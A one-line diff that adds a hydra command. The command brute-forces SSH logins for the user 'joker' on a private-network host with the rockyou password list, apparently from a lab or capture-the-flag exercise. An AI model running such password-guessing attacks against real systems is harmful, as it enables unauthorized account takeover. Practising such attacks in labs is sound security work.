@@ -1,0 +1,1 @@
+hydra -l joker -P /usr/share/wordlists/rockyou.txt ssh://192.168.29.14
